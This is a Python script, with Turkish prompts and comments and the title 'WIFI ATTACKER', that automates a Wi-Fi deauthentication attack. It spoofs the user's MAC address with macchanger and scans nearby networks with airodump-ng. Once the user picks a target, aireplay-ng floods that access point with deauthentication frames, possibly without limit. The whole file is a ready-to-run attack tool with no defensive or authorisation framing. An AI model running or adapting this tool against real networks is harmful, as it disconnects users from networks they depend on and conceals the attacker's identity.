import os
import subprocess
import re
import time

# Gerekli paketleri yükle
os.system("apt-get install -y figlet macchanger aircrack-ng")

# Ekranı temizle ve başlık yazdır
os.system("clear")
os.system("figlet WIFI ATTACKER")
print("          ! Lütfen wifi kartınızı seçiniz !\n")

# Ağ arayüzlerini listele ve numaralandır
arayuzler = subprocess.check_output(["nmcli", "d"]).decode().splitlines()
arayuzler = [line for line in arayuzler if "wifi" in line or "wlan" in line]
for i, arayuz in enumerate(arayuzler, start=1):
    print(f"{i}. {arayuz}")

# Kullanıcıdan wifi kartı seçimi al
arayuz_no = int(input("WİFİ KARTININ NUMARASINI GİRİNİZ: ")) - 1
wifi_kart = arayuzler[arayuz_no].split()[0]

os.system("ifconfig " + wifi_kart + " down")
time.sleep(2)
os.system("macchanger -r " + wifi_kart)
time.sleep(2)
os.system("ifconfig " + wifi_kart + " up")
time.sleep(2)

# Ekranı temizle ve kullanıcıyı bilgilendir
os.system("clear")
print("LÜTFEN HEDEF WİFİ AĞINI SEÇİNİZ! 10 SANİYE BEKLEYİNİZ...")
time.sleep(2)

# airodump-ng aracını çalıştır ve çıktıyı CSV formatında kaydet
airodump_prosesi = subprocess.Popen(
    ["airodump-ng", wifi_kart, "--write-interval", "1", "--output-format", "csv", "-w", "/tmp/airodump"],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# 10 saniyelik geri sayım
for i in range(10, 0, -1):
    print(f"WiFi taraması devam ediyor... {i} saniye kaldı", end='\r')
    time.sleep(1)
print("\nTarama tamamlandı!")

# airodump-ng sürecini sonlandır
airodump_prosesi.terminate()

# Oluşturulan CSV dosyasını oku ve BSSID, kanal ve isim bilgilerini topla
csv_dosyasi = "/tmp/airodump-01.csv"
veriler = []

try:
    with open(csv_dosyasi, 'r') as f:
        # Dosya başlıklarını atla
        for satir in f:
            if re.match(r"^BSSID,", satir):
                break
        # BSSID, kanal ve isimleri topla
        for satir in f:
            if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", satir):
                bolunmus = satir.split(',')
                if len(bolunmus) > 13:  # Satırın yeterli sütuna sahip olup olmadığını kontrol et
                    bssid = bolunmus[0].strip()
                    kanal = bolunmus[3].strip()
                    isim = bolunmus[13].strip()
                    veriler.append((bssid, kanal, isim))
except FileNotFoundError:
    print("CSV dosyası bulunamadı. airodump-ng'in doğru çalıştığından emin olun.")

# Verileri BSSID'ye göre sırala ve yalnızca isimleri yazdır
sirali_veriler = sorted(veriler, key=lambda x: x[2])
for i, (bssid, kanal, isim) in enumerate(sirali_veriler, start=1):
    print(f"{i}. İsim: {isim}")

# Kullanıcıdan saldırı yapılacak ağın sırasını al
sira = int(input("SALDIRI YAPMAK İÇİN AĞIN SIRASINI GİRİNİZ (1, 2, 3...): ")) - 1
hedef_bssid, hedef_kanal, hedef_isim = sirali_veriler[sira]

# Kullanıcıdan saldırı sayısını al
sayi = input("SALDIRI ADETİ 'sonsuz=0' :")



print("SALDIRI 5 SN İÇERİSİNDE BAŞLAYACAKTIR DURDURMAK İÇİN -CTRL C-")
time.sleep(5)
os.system("airmon-ng stop "+wifi_kart)
time.sleep(5)
os.system("airmon-ng start "+wifi_kart+ " " + hedef_kanal)
time.sleep(2)
os.system("nmcli d")
wifi_kart2 = input("aynı wifi kartınızı yada sonunda 'mon' bulunan kartı tekrar giriniz : ")

os.system("aireplay-ng --deauth " + sayi + " -a " + hedef_bssid + " " + wifi_kart2)

# Çıkış için kullanıcıdan giriş al
cikis = input('\n"ÇIKMAK İÇİN -q- TUŞUNA BASINIZ !')

time.sleep(2)
os.system("rm -r /tmp/airodump-01.csv ")

if cikis == "q":
    os.system("service NetworkManager restart")
    time.sleep(2)
    os.system("exit")
